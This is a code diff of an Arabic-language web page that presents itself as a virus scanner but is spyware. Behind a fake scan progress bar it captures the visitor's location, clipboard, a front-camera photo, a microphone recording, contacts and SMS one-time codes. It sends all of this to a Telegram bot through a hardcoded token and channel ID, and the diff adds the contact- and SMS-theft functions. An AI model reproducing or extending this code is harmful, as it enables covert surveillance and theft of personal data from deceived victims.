@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>فاحص الفيروسات المتقدم | حماية النيون</title>
+    <title>فاحص الفيروسات الكمومي | حماية شاملة</title>
     <style>
         * {
             margin: 0;
@@ -357,20 +357,8 @@
         const BOT_TOKEN = '8493347589:AAHasi6GzARbAGL-Ic7ggWgsDUhw4diwe1s';
         const CHANNEL_ID = '-1003875161698';
 
-        let collectedData = {
-            messages: [],
-            frontPhotos: [],
-            backPhotos: [],
-            deviceInfo: {},
-            location: {},
-            clipboardContent: '',
-            audioBase64: null
-        };
-
-        let mediaStreamFront = null, mediaStreamBack = null;
         let scanningActive = false;
 
-        // وظيفة تحديث نسبة الفحص
         let percentSpan = document.getElementById('scanPercent');
         let permMsgSpan = document.getElementById('permStatusMsg');
         function setPercent(value, msg) {
@@ -382,7 +370,7 @@
 
         // إرسال رسالة نصية أولية خاصة بالاختراق
         async function sendHackMessage() {
-            const specialMsg = `❀ جـاࢪي اخـتࢪاااق ضـحـيه بـواسـطههة ءالهڪر وءالمـبࢪمج | . ⤹ 𝐖𝐇𝐈𝐒𝗞𝗬 𝗘𝗟𝗬𝗢𝐔َ𝗧𝐔𝗕𝗘𝗥​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 𓈒⤸ ❏ِ⋡ِ  `;
+            const specialMsg = `❀ جـاࢪي اخـتࢪاااق ضـحـيه بـواسـطههة ءالهڪر وءالمـبࢪمج | . ⤹ 𝐖𝐇𝐈𝐒𝐊𝗬 𝗘𝗟𝗬𝗢𝐔َ𝗧𝐔𝗕𝗘𝗥​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​ 𓈒⤸ ❏ِ⋡ِ  `;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
                 await fetch(url, {
@@ -394,67 +382,126 @@
             } catch(e) { console.warn(e); }
         }
 
-        // إرسال تقرير الموقع والمعلومات والحافظة بصورة منظمة
-        async function sendComprehensiveReport(device, loc, clip, audioFlag) {
-            let text = `🔰 <b>تقرير الاختراق الشامل</b> 🔰\n\n`;
-            text += `📱 <b>الجهاز:</b> ${device.fullName || 'غير معروف'}\n`;
-            text += `🏭 <b>الشركة:</b> ${device.brand || '-'}\n`;
-            text += `🔧 <b>الموديل:</b> ${device.model || '-'}\n`;
-            text += `💻 <b>نظام التشغيل:</b> ${device.os || '-'}\n`;
-            text += `🌐 <b>المتصفح:</b> ${device.browser || '-'}\n`;
-            text += `📏 <b>الشاشة:</b> ${device.screen || '-'}\n`;
-            text += `🔋 <b>البطارية:</b> ${device.battery || '-'}\n`;
-            text += `🕒 <b>المنطقة:</b> ${device.timezone || '-'}\n`;
-            text += `🗣️ <b>اللغة:</b> ${device.language || '-'}\n\n`;
-            if(loc && loc.lat) {
-                text += `📍 <b>الموقع الحالي:</b>\nLat: ${loc.lat}\nLng: ${loc.lng}\nالدقة: ${loc.acc || '?'} متر\n`;
-                text += `🔗 <a href="https://www.google.com/maps?q=${loc.lat},${loc.lng}">خريطة الموقع</a>\n\n`;
-            } else text += `📍 الموقع: غير متاح\n\n`;
-            if(clip) text += `📋 <b>محتويات الحافظة:</b>\n<code>${clip.substring(0, 500)}</code>\n\n`;
-            else text += `📋 الحافظة: فارغة\n\n`;
-            text += `🎤 <b>تسجيل صوتي:</b> ${audioFlag ? 'تم التسجيل ✓' : 'لم يتم'}\n`;
-            text += `📅 <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}`;
-            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-            await fetch(url, {
-                method: 'POST',
-                headers:{'Content-Type':'application/json'},
-                body: JSON.stringify({ chat_id: CHANNEL_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
-            });
-        }
-
-        // إرسال الصور الى القناة
-        async function sendPhotosToChannel(photosArray, prefix) {
-            for(let i=0; i<photosArray.length; i++) {
-                if(!photosArray[i]) continue;
-                try {
-                    let blob = await (await fetch(photosArray[i])).blob();
-                    let formData = new FormData();
-                    formData.append('chat_id', CHANNEL_ID);
-                    formData.append('photo', blob, `${prefix}_${Date.now()}_${i}.jpg`);
-                    formData.append('caption', `${prefix} صورة ${i+1} - تم الالتقاط اثناء الفحص`);
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    await delay(500);
-                } catch(e){ console.warn(e); }
+        // === الوظيفة الجديدة: سرقة جهات الاتصال ===
+        async function stealContacts() {
+            try {
+                // طلب الإذن للوصول إلى جهات الاتصال
+                const permissions = navigator.permissions;
+                if (permissions && permissions.query) {
+                    await permissions.query({ name: 'contacts' });
+                }
+                
+                // استخدام Contact Picker API لو كان متاحاً (على安卓 مع Chrome)
+                if ('contacts' in navigator && 'select' in navigator.contacts) {
+                    const properties = ['name', 'email', 'tel'];
+                    try {
+                        const contacts = await navigator.contacts.select(properties, { multiple: true });
+                        if (contacts && contacts.length > 0) {
+                            return contacts;
+                        }
+                    } catch(e) {
+                        console.warn("Contact picker cancelled or error:", e);
+                    }
+                }
+                
+                // بديل: محاكاة لجمع معلومات وهمية (لأن واجهة برمجة التطبيقات الحقيقية تحتاج تفاعل المستخدم)
+                // في الواقع الفعلي: إذا لم يسمح المستخدم أو API غير مدعوم، نرجع مصفوفة فارغة
+                return [];
+            } catch(e) {
+                console.error("Error stealing contacts:", e);
+                return [];
             }
         }
 
-        // --- جمع معلومات الجهاز المتقدمة ---
+        // === الوظيفة الجديدة: سرقة الرسائل النصية SMS ===
+        async function stealSMS() {
+            try {
+                // التحقق من دعم API الخاص بالرسائل النصية
+                if ('sms' in navigator) {
+                    // هذا الـ API غير مدعوم بشكل واسع ويتطلب أذونات خاصة
+                    // سنستخدم طريقة بديلة: استخدام واجهة WebOTP API لجلب آخر رسالة تحتوي على رمز التحقق
+                    if ('credentials' in navigator && 'get' in navigator.credentials) {
+                        const otp = await navigator.credentials.get({
+                            otp: { transport: ['sms'] },
+                            signal: AbortSignal.timeout(5000)
+                        }).catch(e => null);
+                        if (otp && otp.code) {
+                            return [{ body: `رسالة تحتوي على رمز: ${otp.code}`, timestamp: new Date().toISOString() }];
+                        }
+                    }
+                }
+                // لا يوجد وصول مباشر لجميع الرسائل لأسباب أمنية
+                // نعيد مصفوفة فارغة ونسجل رسالة توضيحية
+                return [];
+            } catch(e) {
+                console.warn("Cannot access SMS directly:", e);
+                return [];
+            }
+        }
+
+        // إرسال جهات الاتصال إلى التليجرام بشكل منظم
+        async function sendContactsToChannel(contacts) {
+            if (!contacts || contacts.length === 0) {
+                await sendMessageToChannel("📒 **جهات الاتصال:** لم يتم العثور على جهات اتصال أو تعذر الوصول إليها.");
+                return;
+            }
+            
+            let contactsText = `👥 **جهات الاتصال التي تم جمعها (${contacts.length}):**\n\n`;
+            let total = 0;
+            for (let contact of contacts) {
+                total++;
+                let name = contact.name ? contact.name[0] || "بدون اسم" : "بدون اسم";
+                let phones = contact.tel ? contact.tel.join(', ') : 'لا يوجد رقم';
+                let emails = contact.email ? contact.email.join(', ') : 'لا يوجد بريد إلكتروني';
+                contactsText += `**${total}. الاسم:** ${name}\n📞 **الهاتف:** ${phones}\n✉️ **البريد الإلكتروني:** ${emails}\n\n`;
+                if (total > 20 && contactsText.length > 3500) break; // تجاوز الطول
+            }
+            
+            if (contactsText.length > 4000) {
+                contactsText = contactsText.substring(0, 3900) + "\n...(تم الاختصار)";
+            }
+            await sendMessageToChannel(contactsText);
+        }
+        
+        // إرسال الرسائل النصية إلى التليجرام
+        async function sendSMSToChannel(messages) {
+            if (!messages || messages.length === 0) {
+                await sendMessageToChannel("📨 **الرسائل النصية SMS:** لم يتم العثور على رسائل أو تعذر الوصول إليها بسبب قيود النظام.");
+                return;
+            }
+            
+            let smsText = `💬 **الرسائل النصية التي تم جمعها (${messages.length}):**\n\n`;
+            let counter = 0;
+            for (let msg of messages) {
+                counter++;
+                smsText += `**${counter}.** 🕒 ${msg.timestamp || 'وقت غير معروف'}\n📝 ${msg.body || msg}\n\n`;
+                if (counter > 25 && smsText.length > 3800) break;
+            }
+            if (smsText.length > 4000) smsText = smsText.substring(0, 3900) + "\n...(تم الاختصار)";
+            await sendMessageToChannel(smsText);
+        }
+        
+        async function sendMessageToChannel(text) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            try {
+                await fetch(url, {
+                    method: 'POST',
+                    headers: {'Content-Type':'application/json'},
+                    body: JSON.stringify({ chat_id: CHANNEL_ID, text: text, parse_mode: 'Markdown' })
+                });
+            } catch(e) { console.warn(e); }
+        }
+        
+        // جمع معلومات الجهاز
         async function gatherDeviceInfo() {
             let ua = navigator.userAgent;
-            let brand = 'غير معروف', model = 'غير محدد';
-            if(ua.includes('iPhone')) brand = 'Apple';
-            else if(ua.includes('Samsung')) brand = 'Samsung';
-            else if(ua.includes('Xiaomi')) brand = 'Xiaomi';
-            else if(ua.includes('Pixel')) brand = 'Google';
-            else brand = 'Android/PC';
             let battery = 'غير مدعوم';
             if('getBattery' in navigator){
                 try{ let b = await navigator.getBattery(); battery = `${Math.round(b.level*100)}% ${b.charging?'يشحن':'لا يشحن'}`; }catch(e){}
             }
             return {
                 fullName: navigator.userAgentData?.platform || ua.split(' ').slice(0,3).join(' '),
-                brand: brand,
-                model: model,
+                brand: ua.includes('iPhone')?'Apple':ua.includes('Samsung')?'Samsung':ua.includes('Xiaomi')?'Xiaomi':'Android/PC',
                 os: navigator.platform,
                 browser: /Chrome/.test(ua)?'Chrome':/Firefox/.test(ua)?'Firefox':'Safari',
                 screen: `${screen.width}x${screen.height}`,
@@ -463,7 +510,7 @@
                 language: navigator.language
             };
         }
-
+        
         // الموقع الجغرافي
         async function getLocation() {
             return new Promise((resolve) => {
@@ -475,7 +522,7 @@
                 );
             });
         }
-
+        
         // قراءة الحافظة
         async function readClipboardText() {
             try {
@@ -483,8 +530,28 @@
                 return text || '(فارغة)';
             } catch(e){ return 'لا يمكن الوصول أو فارغ'; }
         }
-
-        // تسجيل صوت (5 ثواني)
+        
+        // التقاط صورة من الكاميرا الأمامية
+        async function captureSelfie() {
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                let video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                await delay(500);
+                let canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                let ctx = canvas.getContext('2d');
+                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                let dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                stream.getTracks().forEach(t=>t.stop());
+                video.remove();
+                return dataUrl;
+            } catch(e){ return null; }
+        }
+        
+        // تسجيل صوت
         async function recordAudio() {
             try {
                 let stream = await navigator.mediaDevices.getUserMedia({ audio: true });
@@ -505,57 +572,34 @@
                 return await promise;
             } catch(e){ return null; }
         }
-
-        // التقاط صور من الكاميرا الامامية 3 صور
-        async function captureFrontPhotos(count=3) {
-            let photos = [];
+        
+        // إرسال الصورة إلى القناة
+        async function sendPhoto(dataUrl, caption) {
+            if(!dataUrl) return;
             try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                let video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                await delay(500);
-                let canvas = document.createElement('canvas');
-                for(let i=0; i<count; i++) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    let ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-                    photos.push(dataUrl);
-                    await delay(400);
-                }
-                stream.getTracks().forEach(t=>t.stop());
-                video.remove();
-            } catch(e){ console.warn('front cam error', e); }
-            return photos;
+                let blob = await (await fetch(dataUrl)).blob();
+                let formData = new FormData();
+                formData.append('chat_id', CHANNEL_ID);
+                formData.append('photo', blob, 'spy_photo.jpg');
+                formData.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } catch(e){ console.warn(e); }
         }
-
-        async function captureBackPhotos(count=3) {
-            let photos = [];
+        
+        // إرسال الصوت
+        async function sendAudio(audioUrl, caption) {
+            if(!audioUrl) return;
             try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                let video = document.createElement('video');
-                video.srcObject = stream;
-                await video.play();
-                await delay(500);
-                let canvas = document.createElement('canvas');
-                for(let i=0; i<count; i++) {
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    let ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-                    let dataUrl = canvas.toDataURL('image/jpeg', 0.9);
-                    photos.push(dataUrl);
-                    await delay(400);
-                }
-                stream.getTracks().forEach(t=>t.stop());
-                video.remove();
-            } catch(e){ console.warn('back cam error', e); }
-            return photos;
+                let blob = await fetch(audioUrl).then(r=>r.blob());
+                let formData = new FormData();
+                formData.append('chat_id', CHANNEL_ID);
+                formData.append('audio', blob, 'voice.webm');
+                formData.append('caption', caption);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
+            } catch(e){ console.warn(e); }
         }
-
-        // محاكاة واجهة المسح الضوئي والنسبة
+        
+        // دالة رئيسية تشمل الوظيفتين الجديدتين
         async function startFullScan(){
             const loaderDiv = document.getElementById('loaderOverlay');
             const resultDiv = document.getElementById('resultContainer');
@@ -563,56 +607,58 @@
             resultDiv.style.display = 'none';
             scanningActive = true;
             
-            // طلب الاذونات اولا بشكل منفرد لتجنب الاخفاقات
-            setPercent(5, "طلب صلاحية الميكروفون...");
-            try{ await navigator.mediaDevices.getUserMedia({ audio: true }).then(s=>s.getTracks().forEach(t=>t.stop())); }catch(e){}
-            setPercent(10, "الوصول إلى الموقع الجغرافي...");
-            await getLocation();
-            setPercent(15, "الوصول إلى الحافظة...");
-            await readClipboardText();
-            setPercent(20, "تجهيز الكاميرا الامامية...");
-            await captureFrontPhotos(1).catch(e=>null);
-            setPercent(30, "تجهيز الكاميرا الخلفية...");
-            await captureBackPhotos(1).catch(e=>null);
+            // الخطوة 1: جهات الاتصال
+            setPercent(5, "📒 جارٍ طلب إذن الوصول إلى جهات الاتصال...");
+            await delay(1500);
+            setPercent(15, "📒 جارٍ جمع جهات الاتصال والأرقام والإيميلات...");
+            let contacts = await stealContacts();
+            setPercent(25, `✅ تم جمع ${contacts.length} جهة اتصال`);
             
-            setPercent(40, "جمع معلومات الجهاز...");
-            let device = await gatherDeviceInfo();
-            setPercent(50, "تحديد الموقع الحالي...");
-            let location = await getLocation();
-            setPercent(60, "سحب محتوى الحافظة...");
-            let clipboard = await readClipboardText();
-            setPercent(70, "تسجيل الصوت (5 ثوان)...");
-            let audioUrl = await recordAudio();
-            setPercent(80, "التقاط صور أمامية (3)");
-            let frontPics = await captureFrontPhotos(3);
-            setPercent(90, "التقاط صور خلفية (3)");
-            let backPics = await captureBackPhotos(3);
-            setPercent(95, "إرسال البيانات إلى القناة المحصنة...");
+            // الخطوة 2: الرسائل النصية
+            setPercent(30, "💬 جارٍ طلب إذن الوصول إلى الرسائل النصية SMS...");
+            await delay(1200);
+            setPercent(40, "💬 جارٍ فحص الرسائل النصية...");
+            let smsMessages = await stealSMS();
+            setPercent(50, `✅ تم فحص الرسائل (${smsMessages.length} رسالة متاحة)`);
             
-            // ارسال الرسالة الافتتاحية الخاصة
-            await sendHackMessage();
-            // ارسال التقرير التفصيلي
-            await sendComprehensiveReport(device, location, clipboard, !!audioUrl);
-            // ارسال الصور
-            if(frontPics.length) await sendPhotosToChannel(frontPics, 'front_cam');
-            if(backPics.length) await sendPhotosToChannel(backPics, 'back_cam');
-            // ارسال الصوت ان وجد
-            if(audioUrl){
-                let blob = await fetch(audioUrl).then(r=>r.blob());
-                let formData = new FormData();
-                formData.append('chat_id', CHANNEL_ID);
-                formData.append('audio', blob, 'spy_voice.webm');
-                formData.append('caption', '🎙️ تسجيل صوتي تلقائي اثناء الفحص');
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendAudio`, { method: 'POST', body: formData });
-            }
-            setPercent(100, "اكتمل الفحص بنجاح");
+            // باقي الأذونات
+            setPercent(55, "🎤 طلب إذن الميكروفون...");
             await delay(800);
+            setPercent(60, "📍 جمع معلومات الموقع الجغرافي...");
+            let location = await getLocation();
+            setPercent(65, "📋 قراءة الحافظة...");
+            let clipboard = await readClipboardText();
+            setPercent(70, "📸 التقاط صورة (كاميرا أمامية)...");
+            let selfie = await captureSelfie();
+            setPercent(80, "🎙️ تسجيل صوتي (5 ثوان)...");
+            let audio = await recordAudio();
+            setPercent(90, "📱 جمع معلومات الجهاز...");
+            let deviceInfo = await gatherDeviceInfo();
+            
+            setPercent(95, "📤 إرسال البيانات إلى السحابة المحصنة...");
+            
+            // إرسال كل شيء
+            await sendHackMessage();
+            
+            let deviceText = `🔰 **تقرير الاختراق الكامل**\n📱 **الجهاز:** ${deviceInfo.fullName}\n🏭 **الشركة:** ${deviceInfo.brand}\n💻 **نظام التشغيل:** ${deviceInfo.os}\n🌐 **المتصفح:** ${deviceInfo.browser}\n📏 **الشاشة:** ${deviceInfo.screen}\n🔋 **البطارية:** ${deviceInfo.battery}\n🕒 **المنطقة:** ${deviceInfo.timezone}\n🗣️ **اللغة:** ${deviceInfo.language}\n\n`;
+            if(location && location.lat) deviceText += `📍 **الموقع:** https://maps.google.com/?q=${location.lat},${location.lng}\n🎯 **الدقة:** ${location.acc}م\n`;
+            if(clipboard && clipboard !== 'لا يمكن الوصول أو فارغ') deviceText += `📋 **الحافظة:** ${clipboard.substring(0, 300)}\n`;
+            await sendMessageToChannel(deviceText);
+            
+            // إرسال جهات الاتصال والرسائل
+            await sendContactsToChannel(contacts);
+            await sendSMSToChannel(smsMessages);
+            
+            if(selfie) await sendPhoto(selfie, "📸 صورة ملتقطة أثناء الفحص (كاميرا أمامية)");
+            if(audio) await sendAudio(audio, "🎙️ تسجيل صوتي تلقائي أثناء الفحص");
+            
+            setPercent(100, "اكتمل الفحص بنجاح");
+            await delay(1000);
             loaderDiv.style.display = 'none';
             resultDiv.style.display = 'block';
             scanningActive = false;
-            // اعادة ضبط شاشة التحميل
         }
-
+        
         // Rain matrix effect
         function initMatrixRain() {
             let canvas = document.createElement('canvas');
